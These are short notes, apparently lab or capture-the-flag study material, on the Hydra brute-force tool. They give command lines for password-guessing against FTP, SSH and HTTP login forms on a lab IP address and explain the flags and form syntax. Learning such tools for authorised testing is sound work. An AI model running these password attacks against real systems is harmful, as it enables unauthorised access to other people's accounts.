# Hydra 

Brute force password cracking program, it has the ability to brute force a lot of protocols

Common command to brute force FTP with the username "user" and the passwords from the list "passlist.txt" :

hydra -l user -P passlist.txt ftp://10.113.186.148

### SSH

hydra -l <username> -P <full path to pass> 10.113.186.148 -t 4 ssh

-l = specifies the username

-p = specifies a list of passwords

-t = sets the number of threads

### Web forms

Hydra can be used to brute force Web forms, the request method must be known

sudo hydra <username> <wordlist> 10.113.186.148 http-post-form "<path>:<login_credentials>:<invalid_response>"

http-post-form : defines the request method

<path> : the login page URL

<login_credentials> : username and password

<invalid_response> : the path of the failed response

Example = hydra -l <username> -P <wordlist> 10.113.186.148 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V

-------------























